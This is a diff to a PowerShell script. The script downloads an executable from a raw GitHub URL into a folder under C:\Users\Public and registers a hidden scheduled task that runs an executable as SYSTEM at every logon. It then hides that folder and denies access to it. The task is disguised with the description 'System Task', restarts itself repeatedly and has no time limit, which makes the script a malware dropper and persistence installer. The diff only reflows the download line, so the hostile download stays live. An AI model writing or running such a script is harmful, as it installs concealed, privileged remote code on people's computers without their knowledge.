@@ -1,7 +1,6 @@
 New-Item -ItemType Directory -Path C:\Users\Public\krnl\win\schvost
-Invoke-WebRequest -Uri 
 
-"https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl.exe" -OutFile "C:\Users\Public\krnl\win\schvost\schvostkrnl.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl.exe" -OutFile "C:\Users\Public\krnl\win\schvost\schvostkrnl.exe"
 
 Register-ScheduledTask -TaskName "WINschvostkrnl" -Action (New-ScheduledTaskAction -Execute "C:\Windows\System32\schvostkrnl.exe") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -Hidden -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) -TaskPath "\" -Description "System Task" -Force
 
@@ -27,5 +26,3 @@ Set-ItemProperty -Path "C:\Users\Public\krnl\win\schvost\schvostkrnl.exe" -Name 
 Start-Process -NoNewWindow -FilePath "icacls" -ArgumentList "`"C:\Users\Public\krnl`" /deny Everyone:(RX)" -Wait
 
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden
-
-
